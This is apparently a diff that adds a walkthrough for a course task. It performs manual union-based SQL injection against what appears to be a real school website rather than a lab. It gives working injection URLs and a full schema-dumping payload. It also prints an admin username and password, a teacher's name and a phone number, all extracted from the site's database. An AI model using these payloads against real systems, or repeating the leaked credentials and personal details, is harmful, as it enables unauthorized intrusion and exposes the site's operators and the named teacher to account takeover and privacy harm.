@@ -1,0 +1,21 @@
+Now in task-3 we are going to do manual SQLi on https://www.scisedu.in/News.php?id=8  using Cyberfox Browser.
+We put ' at the end of the url to check if it's vulnerable to sqli like this - https://www.scisedu.in/News.php?id=8'
+and it is vulnerable. Now to go back we do, 
+https://www.scisedu.in/News.php?id=8'--+ 
+After that we want to find the vulnerable coloumn so we go UNION BASED --> Column count --> ORDER BY and after few tries we get
+https://www.scisedu.in/News.php?id=8'+ORDER+BY+7--+
+Now go to UNION BASED --> Union statement --> INT,INT 
+https://www.scisedu.in/News.php?id=-8' Union Select 1,2,3,4,5,6,7--+
+and we found vulnerable columns 4,3,5
+Now we apply any dios mysql on column 4 
+https://www.scisedu.in/News.php?id=-8%27%20Union%20Select%201,2,3,(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x),5,6,7--+
+and found so many tables and columns. Now according to the questions we are asked of users and teachers details so we choose 'users' & 'teachers'.
+first of 'users' to find the answer of question-1 --
+https://www.scisedu.in/News.php?id=-8%27%20Union%20Select%201,2,3,group_concat(id,0x3d,user,0x3d,utype,0x3d,password),5,6,7 from users--+
+and you'll see --- 1=admin12345=admin=scisedu!@# ... we found the answer of question-1 that is, scisedu!@#
+now to find question-2 and 3, we find 'teachers'
+https://www.scisedu.in/News.php?id=-8%27%20Union%20Select%201,2,3,group_concat(id,0x3d,tname,0x3d,class,0x3d,designation,0x3d,contactno,0x3d, subject),5,6,7 from teachers--+
+and we found answer of question-2 --> SHASHI KUMARI SHARMA
+and question-3 --> 9827977774
+
+p.s check for spelling errors, missing commas, signs if you are failed to find the answers. 
